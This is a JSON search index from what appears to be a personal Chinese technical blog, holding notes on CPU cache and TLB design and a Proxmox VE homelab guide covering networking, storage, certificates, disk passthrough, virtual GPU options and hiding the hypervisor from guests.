cache\u4e2d\u91cd\u540d\u7684\u7684\u865a\u62df\u5730\u5740\uff0c\u53ea\u5b58\u50a8\u4e00\u4efd\uff0c\u53e6\u4e00\u4e2a\u65e0\u6548\u6389 \u8fc7\u7a0b - VA2\u8bbf\u95eeL1\u5982\u679c\u7f3a\u5931\uff0c\u5219PA\u8bbf\u95eeL2\uff08\u4f7f\u7528PIPT\uff09 - L2\u4e2d\u5982\u679c\u5df2\u7ecf\u5b58\u5728PA\u7684\u6570\u636e\uff0c\u5219\u8868\u793aL1\u53ef\u80fd\u5b58\u5728\u91cd\u540d\u3002     - L2\u9664\u4e86\u6b63\u5e38\u7684physical tag\uff0c\u8fd8\u9700\u8981\u5b58\u50a8L1\u4e2dVA\u7684a\u3002\u5982\u679cVA2\u7684a\u548c\u5b58\u50a8\u7684a\u4e0d\u540c\uff0c\u5219\u8868\u793aL1\u5b58\u5728\u91cd\u540d\u7684cache line - \u91cd\u540d\u7684\u8bdd\uff0c\u5c06L1\u4e2d\u7684VA1\uff08a+offset\uff09cache line\u7f6e\u4e3a\u65e0\u6548</p> <p></p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#tlb-asid-cache\u63a7\u5236\u6307\u4ee4","title":"TLB ASID, cache\u63a7\u5236\u6307\u4ee4","text":"","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#tlb-asid","title":"TLB ASID","text":"<p>\u8fdb\u7a0b\u5207\u6362\u65f6\uff0c\u4f1a\u5207\u6362\u9875\u8868\u3002\u4f46\u662fTLB\u4e2d\u4ecd\u7136\u4fdd\u5b58\u7740\u6570\u636e\uff0c\u56e0\u6b64\u53ef\u80fd\u4f1a\u9519\u8bef\u547d\u4e2d\u3002</p> <p>TLB\u4e2d\u7f13\u5b58\u7740\u9875\u8868\u9879\uff08\u865a\u62df\u9875\u53f7\u5230\u7269\u7406\u9875\u53f7\u7684\u6620\u5c04\uff09\uff0c\u5f53\u8fdb\u7a0b\u5207\u6362\u540e\uff0c\u7406\u8bba\u4e0a\u9700\u8981\u6e05\u7a7aTLB\uff0c\u53ef\u80fd\u6d6a\u8d39\u4e86\u6709\u7528\u7684\u503c\u3002 \u4e3a\u4e86\u89e3\u51b3\u4f4e\u6548\u7684\u6e05\u7a7a\u64cd\u4f5c\uff0c\u5f15\u5165\u4e86ASID</p> <p>\u65e2\u7136\u65e0\u6cd5\u76f4\u63a5\u4ece\u865a\u62df\u5730\u5740\u4e2d\u5224\u65ad\u5b83\u5c5e\u4e8e\u54ea\u4e2a\u8fdb\u7a0b\uff0c\u90a3\u4e48\u5c31\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u8d4b\u4e00\u4e2a\u7f16\u53f7\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u4e2d\u4ea7\u751f\u7684\u865a\u62df\u5730\u5740\u90fd\u9644\u4e0a\u8fd9\u4e2a\u7f16\u53f7\uff0c\u8fd9\u4e2a\u7f16\u53f7\u5c31\u76f8\u5f53\u4e8e\u662f\u865a\u62df\u5730\u5740\u7684\u4e00\u90e8\u5206\uff0c\u8fd9\u6837\u4e0d\u540c\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u5c31\u80af\u5b9a\u662f\u4e0d\u4e00\u6837\u4e86\u3002\u8fd9\u4e2a\u7f16\u53f7\u79f0\u4e3aPID(Process ID),\u5f53\u7136\u66f4\u901a\u7528\u7684\u53eb\u6cd5\u662fASID(Address Space IDentifier)</p> <p>\u540c\u65f6TLB\u4e2d\u8fd8\u6dfb\u52a0\u4e86global\u4f4d\uff0c\u5982\u679cG\u4f4d\u4e3a1\uff0c\u5219\u5ffd\u7565ASID\uff0c\u7528\u4e8e\u5b9e\u73b0\u5168\u5c40\u5171\u4eab\u3002</p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#cache\u63a7\u5236\u6307\u4ee4","title":"cache\u63a7\u5236\u6307\u4ee4","text":"<p>\u53ef\u80fd\u5b58\u5728\u4e00\u4e9b\u64cd\u4f5c\uff0c\u53ef\u80fd\u5bfc\u81f4cache\u4e2d\u6570\u636e\u548cram\u4e2d\u4e0d\u4e00\u81f4\uff0c\u9700\u8981\u624b\u52a8\u7ba1\u7406cache</p> <p>cache\u4e00\u81f4\u6027 - DMA   - src\u5982\u679cdirty\uff0c\u9700\u8981\u5199\u56de\u5185\u5b58   - \u5199\u5165dst\u540e\uff0c\u9700\u8981\u65e0\u6548\u6389cache\u4fdd\u8bc1\u8bfb\u5230\u6700\u65b0\u6570\u636e - \u81ea\u4fee\u6539\u7a0b\u5e8f\u3002\u7a0b\u5e8f\u53ef\u80fd\u6709\u65f6\u9700\u8981\u52a8\u6001\u751f\u6210\u6307\u4ee4\u6267\u884c\uff0c\u751f\u6210\u7684\u6307\u4ee4\u4f1a\u4f5c\u4e3a\u6570\u636e\u5199\u5165d cache\u4e2d\u3002\u7531\u4e8ei cache\u548cd cache\u95f4\u4e0d\u4f1a\u81ea\u52a8\u540c\u6b65   - \u8981\u60f3\u6267\u884c\u8fd9\u4e9b\u6307\u4ee4\uff0c\u9700\u8981\u5c06\u6570\u636e\u5199\u56de\u5185\u5b58\uff0c\u5e76\u65e0\u6548\u6389i-cache\u4e2d\u5bf9\u5e94\u6307\u4ee4\u3002 - \u6709\u65f6\u5c31\u662f\u9700\u8981\u5c06cache\u4e2ddirty\u90e8\u5206\u5199\u56de\u5185\u5b58\uff0c\u6bd4\u5982page fault\u65f6\u66ff\u6362\u6389dirty\u7684\u9875\u3002</p> <p>cache\u64cd\u4f5c\u53ef\u4ee5\u603b\u7ed3\u4e3a\u51e0\u79cd\uff1aclean\uff0c\u65e0\u6548 (l)\u80fd\u591f\u5c06I-Cache\u5185\u7684\u6240\u6709Cache Line\u90fd\u7f6e\u4e3a\u65e0\u6548\uff1b (2)\u80fd\u591f\u5c06I-Cache\u5185\u7684\u67d0\u4e2aCache Line\u7f6e\u4e3a\u65e0\u6548\uff1b (3)\u80fd\u591f\u5c06D-Cache\u5185\u7684\u6240\u6709Cache Line\u8fdb\u884cclean; (4)\u80fd\u591f\u5c06D-Cache\u5185\u7684\u67d0\u4e2aCache Line\u8fdb\u884cclean; (5)\u80fd\u591f\u5c06D-Cache\u5185\u7684\u6240\u6709Cache Line\u8fdb\u884cclean,\u5e76\u7f6e\u4e3a\u65e0\u6548\uff1b (6)\u80fd\u591f\u5c06D-Cache\u5185\u7684\u67d0\u4e2aCache Line\u8fdb\u884cclean,\u5e76\u7f6e\u4e3a\u65e0\u6548\u3002</p> <p>\u5b9a\u4f4dcache line\u6709\u51e0\u79cd\u65b9\u5f0f - set/way - \u5730\u5740\uff08\u6839\u636ecache\u7c7b\u578b\uff0c\u53ef\u80fd\u662f\u865a\u62df\u5730\u5740\u4e5f\u53ef\u80fd\u662f\u7269\u7406\u5730\u5740\uff09</p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#arm","title":"ARM","text":"<p>ARM\u4f7f\u7528CP15\u534f\u5904\u7406\u5668\uff08\u901a\u8fc7\u63a7\u5236\u5176\u5bc4\u5b58\u5668\u6765\u7ba1\u7406cache\uff09</p> <pre><code>MRC{&lt;cond&gt;)&lt;coproc&gt;,&lt;Op1&gt;,&lt;Rt&gt;,CRn&gt;,CRm&gt;,&lt;Op2&gt;}\nMCR[&lt;cond&gt;)&lt;coproc&gt;,&lt;Op1&gt;,&lt;Rt&gt;,CRn&gt;,CRm&gt;,&lt;Op2&gt;)\n</code></pre> <p>MRC\u6307\u4ee4\u5c06\u534f\u5904\u7406\u5668\u4e2d\u67d0\u4e2a\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u653e\u5230\u5904\u7406\u5668\u5185\u90e8\u6307\u5b9a\u7684\u901a\u7528\u5bc4\u5b58\u5668\u4e2d\uff0c MCR\u6307\u4ee4\u5c06\u5904\u7406\u5668\u5185\u90e8\u67d0\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u653e\u5230\u534f\u5904\u7406\u5668\u5185\u90e8\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d</p> <p></p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#mips","title":"MIPS","text":"<p>MIPS\u4e2d\u4f7f\u7528CACHE\u6307\u4ee4</p> <p></p> <p>\u683c\u5f0f\u548cload\uff0cstore\u6307\u4ee4\u7c7b\u4f3c\uff0c\u8ba1\u7b97Effective address<code>EA = GPR[base] + offset</code> </p>","tags":["cpu","cache","VIPT"]},{"location":"%E6%9D%82%E6%96%87/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u8d85\u6807\u91cf\u5904\u7406\u5668\u8bbe\u8ba1\uff0c\u59da\u6c38\u658c\uff0c\u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e</li> </ul>","tags":["cpu","cache","VIPT"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/","title":"PVE","text":"<p>PVE\u7528\u6cd5\u3001\u914d\u7f6e\u4e2a\u4eba\u8bb0\u5f55</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>\u5b89\u88c5\u6ce8\u610f\u4e8b\u9879 - \u4e4b\u540e\u4fee\u6539hostname\u5f88\u9ebb\u70e6\uff0c\u56e0\u6b64\u4e00\u5f00\u59cb\u5c31\u786e\u5b9a\u597d - zfs\u662f\u6211\u6bd4\u8f83\u63a8\u8350\u7684\u7cfb\u7edf\u76d8\u683c\u5f0f\uff0c\u540e\u9762\u521b\u5efa\u865a\u62df\u673a\uff0clxc\u5bb9\u5668\uff0c\u78c1\u76d8\u955c\u50cf\u90fd\u4f1a\u76f4\u63a5\u4f7f\u7528zfs\u7684zvol\u529f\u80fd\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528zfs\u81ea\u5df1\u7ba1\u7406\u8fd9\u4e9b\u78c1\u76d8\u955c\u50cf\uff0c\u975e\u5e38\u65b9\u4fbf\u3002</p> <p>\u6362\u6e90\uff1aProxmox \u6e90\u4f7f\u7528\u5e2e\u52a9 \u2014 USTC Mirror Help \u6587\u6863</p> <p>\u5e38\u7528\u547d\u4ee4\u5de5\u5177\uff1aCommand Line Tools - Proxmox VE</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#pve\u914d\u7f6e","title":"PVE\u914d\u7f6e","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u7f51\u7edc\u914d\u7f6e","title":"\u7f51\u7edc\u914d\u7f6e","text":"<p>\u7f51\u7edc\u91c7\u7528ifupdown <pre><code>/etc/network/interfaces\n\nifreload -a  # \u5e94\u7528\u66f4\u6539\n</code></pre></p> <ul> <li>\u521b\u5efa\u4e24\u4e2abr\uff0c\u5c45\u7136\u4e0d\u652f\u6301\u8bbe\u7f6e\u4e24\u4e2adefault route\u3002\u89e3\u51b3\u529e\u6cd5\u662f\u5728interface\u914d\u7f6e\u6587\u4ef6\u4e2d\u901a\u8fc7post-up\u81ea\u5df1\u6dfb\u52a0 <pre><code>auto vmbr0\niface vmbr0 inet static\n        address 210.45.76.204/24\n        bridge-ports enp7s0\n        bridge-stp off\n        bridge-fd 0\n        post-up ip ru add from 210.45.76.204 lookup vmbr0 prior 3\n        post-up ip ro add table vmbr0 default via 210.45.76.254 dev vmbr0\n        post-up ip ro add default via 210.45.76.254 dev vmbr0 metric 200\n\nauto vmbr1\niface vmbr1 inet static\n        address 192.168.35.254/24\n        bridge-ports enxf8e43b0a274a\n        bridge-stp off\n        bridge-fd 0\n        post-up ip ro add default via 192.168.35.1 dev vmbr1 metric 100\n        pre-down ip ro del default dev vmbr1\n</code></pre></li> </ul>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u5b58\u50a8\u914d\u7f6e","title":"\u5b58\u50a8\u914d\u7f6e","text":"<p>Proxmox VE Storage</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u57fa\u7840\u6982\u5ff5","title":"\u57fa\u7840\u6982\u5ff5","text":"<p>storage\uff08\u6c60\uff09\u7c7b\u578b - file level\uff1a\u53ef\u4ee5\u5b58\u50a8\u4efb\u4f55\u7c7b\u578b\u5185\u5bb9 - block\uff1a\u5b58\u50a8\u5927\u7684raw images</p> <p>1: Disk images for VMs are stored in ZFS volume (zvol) datasets, which provide block device functionality. 2: On file based storages, snapshots are possible with the\u00a0qcow2\u00a0format.</p> <p>\u5b58\u50a8\u7684\u6570\u636e\u7c7b\u578b</p> <p>A storage can support several content types, for example virtual disk images, cdrom iso images, container templates or container root directories. Not all storage types support all content types. One can set this property to select what this storage is used for. - images: QEMU/KVM VM images. - rootdir: Allow to store container data. - vztmpl: Container templates. - backup: Backup files (vzdump). - iso: ISO images - snippets: Snippet files, for example guest hook scripts</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"<p>/etc/pve/storage.cfg <pre><code>dir: local\n        path /var/lib/vz\n        content iso,vztmpl,backup\n\n# default image store on ZFS based installation\nzfspool: local-zfs\n        pool rpool/data\n        sparse\n        content images,rootdir\n</code></pre></p> <p>local\u66f4\u50cf\u662f\u5b58\u50a8\u53ea\u8bfb\u7684\u6570\u636e local-zfs\u5219\u5b58\u653e\u8bfb\u5199\u7684\u6570\u636e - \u865a\u62df\u673a\u7684disk\u4e3azvol - lxc\u5bb9\u5668\u7684rootdir\u4e3adataset</p> <p>Volume id\u683c\u5f0f\uff08\u8bb8\u591a\u547d\u4ee4\u90fd\u9700\u8981\u8be5\u683c\u5f0f\u53c2\u6570\uff09 <pre><code>local:230/example-image.raw\n\nlocal:iso/debian-501-amd64-netinst.iso\n\nlocal:vztmpl/debian-5.0-joomla_1.5.9-1_i386.tar.gz\n\niscsi-storage:0.0.2.scsi-14f504e46494c4500494b5042546d2d646744372d31616d61\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u547d\u4ee4\u884c\u5de5\u5177","title":"\u547d\u4ee4\u884c\u5de5\u5177","text":"<pre><code>pvesm add &lt;TYPE&gt; &lt;STORAGE_ID&gt; &lt;OPTIONS&gt;\npvesm add dir &lt;STORAGE_ID&gt; --path &lt;PATH&gt;\npvesm add nfs &lt;STORAGE_ID&gt; --path &lt;PATH&gt; --server &lt;SERVER&gt; --export &lt;EXPORT&gt;\npvesm add lvm &lt;STORAGE_ID&gt; --vgname &lt;VGNAME&gt;\npvesm add iscsi &lt;STORAGE_ID&gt; --portal &lt;HOST[:PORT]&gt; --target &lt;TARGET&gt;\n\npvesm set &lt;STORAGE_ID&gt; &lt;OPTIONS&gt;\npvesm set &lt;STORAGE_ID&gt; --shared 1\npvesm set local --format qcow2\npvesm set &lt;STORAGE_ID&gt; --content iso\n\npvesm alloc &lt;STORAGE_ID&gt; &lt;VMID&gt; &lt;name&gt; &lt;size&gt; [--format &lt;raw|qcow2&gt;]\npvesm alloc local &lt;VMID&gt; '' 4G  # name\u4e3a\u7a7a\u5219\u81ea\u52a8\u751f\u6210\n\npvesm free &lt;VOLUME_ID&gt;\n\npvesm status\npvesm list &lt;STORAGE_ID&gt; [--vmid &lt;VMID&gt;]\n\npvesm path &lt;VOLUME_ID&gt; #\u67e5\u770b\u5b9e\u9645\u8def\u5f84\n</code></pre>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u4e0d\u540cbackend","title":"\u4e0d\u540cbackend","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#dir","title":"dir","text":"<p>\u53ef\u4ee5\u5b58\u50a8\u4efb\u4f55\u7c7b\u578b\u6570\u636e\uff08virtual disk images, containers, templates, ISO images or backup files.\uff09</p> <p>You can mount additional storages via standard linux\u00a0/etc/fstab, and then define a directory storage for that mount point. This way you can use any file system supported by Linux.</p> <p>\u9ed8\u8ba4layout</p> Content type Subdir VM images <code>images/&lt;VMID&gt;/</code> ISO images template/iso/ Container templates template/cache/ Backup files dump/ Snippets snippets/ <p>\u4f8b\u5b50 <pre><code>dir: backup\n        path /mnt/backup\n        content backup\n        prune-backups keep-last=7\n        max-protected-backups 3\n        content-dirs backup=custom/backup/dir\n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#zfs","title":"zfs","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#lvm","title":"lvm","text":"<p>Proxmox VE Storage Proxmox Storage Guide | Programster's Blog</p> Content types Image formats Shared Snapshots Clones images rootdir raw possible no no","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#lvm-thin","title":"lvm-thin","text":"<p>\u652f\u6301thin provisioning\uff08\u7a00\u758f\u5206\u914d\uff09</p> <p>LVM normally allocates blocks when you create a volume. LVM thin pools instead allocates blocks when they are written. This behaviour is called thin-provisioning</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u8bc1\u4e66\u7ba1\u7406","title":"\u8bc1\u4e66\u7ba1\u7406","text":"<p>pve\u7684\u00a0REST API \u548c web GUI \u662f\u7531<code>pveproxy</code>\u670d\u52a1\u63d0\u4f9b\u7684\uff0c\u5b83\u4f7f\u7528\u7684\u8bc1\u4e66\u53ef\u4ee5\u662f\u4ee5\u4e0b\u51e0\u79cd 1. By default the node-specific certificate in\u00a0<code>/etc/pve/nodes/NODENAME/pve-ssl.pem</code>\u00a0is used. This certificate is signed by the cluster CA and therefore not automatically trusted by browsers and operating systems. 2. use an externally provided certificate (e.g. signed by a commercial CA). 3. use ACME (Let\u2019s Encrypt) to get a trusted certificate with automatic renewal, this is also integrated in the Proxmox VE API and web interface. \u57282\u548c3\u7684\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u7684\u8bc1\u4e66\u4f4d\u4e8e<code>/etc/pve/nodes/NODENAME/pveproxy-ssl.pem</code> <pre><code>-rw-r----- 1 root www-data 3.2K Dec  2 14:46 pveproxy-ssl.key\n-rw-r----- 1 root www-data 5.8K Dec  2 14:46 pveproxy-ssl.pem\n-rw-r----- 1 root www-data 1.7K Sep 13 21:04 pve-ssl.key\n-rw-r----- 1 root www-data 1.8K Sep 13 21:04 pve-ssl.pem\n</code></pre></p> <p>\u8bc1\u4e66\u4f7f\u7528pvenode\u547d\u4ee4\u7ba1\u7406</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#trusted-certificates-via-lets-encrypt-acme","title":"Trusted certificates via Let\u2019s Encrypt (ACME)","text":"<ul> <li>\u9996\u5148\u9700\u8981\u6ce8\u518c\u4e00\u4e2aACME\u8d26\u53f7\uff0c\u4ec5\u9700\u8981\u63d0\u4f9b\u90ae\u7bb1\u7528\u4e8e\u63a5\u6536\u901a\u77e5</li> <li>web\u754c\u9762\uff1aDatacenter -&gt; ACME</li> <li> <p>\u547d\u4ee4\u884c   <pre><code>pvenode acme account register account-name mail@example.com\n</code></pre></p> </li> <li> <p>\u7136\u540e\u6dfb\u52a0\u4e00\u4e2aACME plugin\uff0c\u7528\u4e8e\u81ea\u52a8\u7533\u8bf7\u548c\u66f4\u65b0\u8bc1\u4e66\uff0c\u652f\u6301\u8bb8\u591adns\u670d\u52a1\u5546</p> </li> <li>plugin ID\uff1a\u81ea\u5df1\u53d6\u4e00\u4e2a\u6807\u8bc6\u540d\u79f0\uff0c\u540e\u9762\u4e3anode\u7533\u8bf7\u8bc1\u4e66\u65f6\u9700\u8981\u6307\u5b9a</li> <li>DNS API\uff1a\u9009\u62e9\u81ea\u5df1\u7684DNS\u670d\u52a1\u5546\uff08\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5e76\u4e14\u6709\u5176\u5b83\u652f\u6301\u7684\u57df\u540d\u7684\u8bdd\uff0c\u53ef\u4ee5\u641c\u7d22DNS Validation through CNAME Alias\u65b9\u6848\uff09</li> <li> <p>\u540e\u9762\u7684\u6570\u636e\u5219\u6839\u636eAPI\u7684\u4e0d\u540c\u662f\u4e0d\u540c\u7684</p> <ul> <li>cloudflare\u652f\u6301\u7c97\u7c92\u5ea6\u7684Global API Key\u548cAPI Token\u4e24\u79cd\u9a8c\u8bc1\u65b9\u5f0f\uff1aUser API Tokens | Cloudflare </li> </ul> </li> <li> <p>\u7136\u540e\u5c31\u662f\u4e3anode\u6dfb\u52a0\u8bc1\u4e66</p> </li> <li>Node -&gt; Certificates\uff0cACME\u9009\u62e9Add</li> <li>\u9009\u62e9challenge type\u5e76\u586b\u5199\u8bc1\u4e66\u5bf9\u5e94\u7684\u57df\u540d</li> <li>\u7136\u540e\u9009\u62e9Account\u7136\u540eOrder Certificates Now\u5373\u53ef </li> </ul>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u865a\u62df\u673a","title":"\u865a\u62df\u673a","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u547d\u4ee4\u884c","title":"\u547d\u4ee4\u884c","text":"<p>qm(1) (proxmox.com)</p> <p>\u4e0d\u5fc5\u586b\u6240\u6709\u53c2\u6570\uff0c\u521b\u5efa\u540e\u5728web\u4e2d\u518d\u6dfb\u52a0 <pre><code>qm create 120 --cores 2 --cpu host --memory 1024 --name u22-test --scsihw virtio-scsi-single --scsi0 local-zfs:vm-120-disk-root \n</code></pre></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u76f4\u901a\u78c1\u76d8","title":"\u76f4\u901a\u78c1\u76d8","text":"<p>Passthrough Physical Disk to Virtual Machine (VM) - Proxmox VE</p> <p>\u5f88\u7b80\u5355\uff0c\u4e0d\u9700\u8981pci\u76f4\u901a\u4e4b\u7c7b\u7684\u3002\u672c\u8d28\u4e0a\u548ckvm\u6dfb\u52a0\u4e00\u4e2a\u78c1\u76d8\u662f\u4e00\u6837\u7684 - \u78c1\u76d8\u53ea\u770b\u505a\u4e00\u4e2a\u5757\u6587\u4ef6\uff0c\u5185\u90e8\u4f1a\u91cd\u65b0\u521b\u5efa\u5206\u533a\u8868\uff1f</p> <ul> <li> <p>Hot-Plug/Add physical device as new virtual SCSI disk <pre><code>qm set 592 -scsi2 /dev/disk/by-id/ata-ST3000DM001-1CH166_Z1F41BLC\n</code></pre></p> </li> <li> <p>Hot-Unplug/Remove virtual disk <pre><code>qm unlink 592 --idlist scsi2\n</code></pre></p> </li> </ul>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u76f4\u901a\u5206\u533a","title":"\u76f4\u901a\u5206\u533a","text":"<p>\u53ea\u9700\u8981\u628a\u4e0a\u9762by-id\u8def\u5f84\u6307\u5b9a\u5177\u4f53\u5206\u533a\u5373\u53ef</p> <p>Is it possible to passthrough a partition of a drive to a VM? and not the entire disk? | Proxmox Support Forum</p> <p>I think \"qm set\" disk passthrough should work with partitions too: https://pve.proxmox.com/wiki/Passthrough_Physical_Disk_to_Virtual_Machine_(VM) Then its just for example\u00a0<code>qm set 592 -scsi2 /dev/disk/by-id/ata-ST3000DM001-1CH166_Z1F41BLC-part3</code>\u00a0instead of\u00a0<code>qm set 592 -scsi2 /dev/disk/by-id/ata-ST3000DM001-1CH166_Z1F41BLC</code></p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u663e\u793a\u8bbe\u5907","title":"\u663e\u793a\u8bbe\u5907","text":"","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u4ecb\u7ecd","title":"\u4ecb\u7ecd","text":"<p>VGA and other display devices in qemu | \ud83c\uddfa\ud83c\udde6 kraxel\u2019s news</p> <p>qxl - \u652f\u63012d\u52a0\u901f\uff0c\u4f46\u662f\u8be5\u529f\u80fd\u73b0\u5728\u5df2\u7ecf\u53d8\u5f97\u4e0d\u518d\u6709\u7528\u4e86\u3002\u8f6f\u4ef6\u901a\u5e38\u4f7f\u7528OpenGL\u6216Vulkan\uff0c3d\u6e32\u67d3\u3002</p> <p>This device has support for 2D acceleration. This becomes more and more useless though as modern display devices don't have dedicated 2D acceleration support any more and use the 3D engine for everything. The same happens on the software side, modern desktops are rendering with opengl or vulkan instead of using 2D acceleration.</p> <p>virtio vga - \u652f\u6301\u786c\u4ef6\u8f85\u7ec4\u7684opengl\u52a0\u901f - \u76ee\u524d\u53ea\u6709linux\u4e0b\u6709\u9a71\u52a8\uff0c\u56e0\u6b64\u53ea\u5728linux\u5de5\u4f5c</p> <p>This device has (optional) hardware-assisted opengl acceleration support. This can be enabled using the\u00a0<code>virgl=on</code>\u00a0property, which in turn needs opengl support enabled (<code>gl=on</code>) in the qemu display.</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#virgl","title":"virgl","text":"<p>(7) VirGL vs GPU passthrough vs VirtIO or QXL : VFIO (reddit.com)</p> <p>\u4e3a\u4e86\u663e\u793a 3D \u56fe\u5f62\uff0c\u6e38\u620f\u9700\u8981\u4e3a GPU \u6253\u5f00\u4e00\u4e2a\u201c\u4e0a\u4e0b\u6587\u201d\u3002\uff08\u65e0\u8bba\u662fDirect3D\uff0cOpenGL\uff0cVulkan\u7b49\uff09\u3002\u6253\u5f00\u6b64\u4e0a\u4e0b\u6587\u540e\uff0c\u4ed6\u4eec\u53ef\u4ee5\u5411 GPU \u53d1\u9001\u547d\u4ee4\u4ee5\u4e0a\u4f20\u7eb9\u7406\u3001\u8fd0\u884c\u7740\u8272\u5668\u3001\u6e32\u67d3\u5185\u5bb9\u7b49\u3002 VirGL\u5141\u8bb8\u8bbf\u5ba2\u5728\u4e3b\u673a\u7684GPU\u4e0a\u6253\u5f00\u8fd9\u4e9b\u4e0a\u4e0b\u6587\u3002\u4e3a\u6b64\uff0c\u5b83\u9700\u8981\u5728 VM \u4e2d\u62e5\u6709\u81ea\u5df1\u7684\u7279\u6b8a\u9a71\u52a8\u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u9a71\u52a8\u7a0b\u5e8f\u72ec\u7acb\u4e8e\u5e95\u5c42 GPU \u7c7b\u578b\u3002 \u672a\u6765\u5f88\u53ef\u80fd\u662f\u00a0GPU-P (or GPU partitioning).\u3002\u6b64\u529f\u80fd\u5141\u8bb8\u7269\u7406 GPU \u63d0\u4f9b\u591a\u4e2a\u865a\u62df\u5206\u533a\uff0c\u5141\u8bb8\u4e3b\u673a\u548c\u6765\u5bbe\u4f7f\u7528\u76f8\u540c\u7684\u7269\u7406 GPU\u3002\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u4f46\u76ee\u524d\u5b83\u4e0d\u53d7\u5b98\u65b9\u652f\u6301\uff08\u5728\u6d88\u8d39\u8005\u5361\u4e2d\uff09\u3002</p> <p>\u9002\u5408\u8f7b\u91cf\u76843d\u52a0\u901f\uff08\u684c\u9762compositor\uff09</p> <p>if you need 3D accel (eg even for desktop compositor effects, no heavy gaming) this is what you want. Otherwise you go with Intel GVT-g or full GPU passthrough.</p> <p>\u76ee\u524d\u8fd8\u4e0d\u652f\u6301HW Video\u7f16\u89e3\u7801\u52a0\u901f</p> <p>One feature I would like is being able to use HW video decode too, but presently that requires passing in full GPU or vGPU.</p> <p>\u8bbe\u7f6e\u540e\uff0c\u5728win10\u4e2d\u6837\u5b50 </p> <p></p> <p>\u53ef\u4ee5\u73a9\u7b80\u5355OpenGL\u6e38\u620f\uff1a\u6d4b\u8bd5\u4e86\u4e1c\u65b9 \u4e0d\u80fd\u73a9yuzu\u6a21\u62df\u5668\uff0c\u9009\u62e9OpenGL\u65f6\uff0c\u53ef\u4ee5\u9009\u62e9GLSL\uff0c\u4f46\u662f\u4e0d\u80fd\u8fd0\u884c\u6e38\u620f\u3002\u9009vulkan\u6ca1\u6709\u8bbe\u5907\u3002</p>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#\u9690\u85cfkvm","title":"\u9690\u85cfKVM","text":"<p>\u8457\u540d\u4e8c\u5b57\u6e38\u620f\u65e0\u6cd5\u5728\u865a\u62df\u673a\u4e2d\u8fd0\u884c </p> <p>https://forum.proxmox.com/threads/hide-vm-from-guest.34905/post-176978 <pre><code>args: -cpu 'host,-hypervisor,+kvm_pv_unhalt,+kvm_pv_eoi,hv_spinlocks=0x1fff,hv_vapic,hv_time,hv_reset,hv_vpindex,hv_runtime,hv_relaxed,kvm=off,hv_vendor_id=intel'\n</code></pre></p> <p>Guest operating systems can test bit 31 of ECX of CPUID leaf 0x1, so\u00a0-hypervisor\u00a0flag prevent this. I can't add links\u00a0. You can read more about virtual machine detection mechanism in vmware knowledge base. Article is called \"Mechanisms to determine if software is running in a VMware 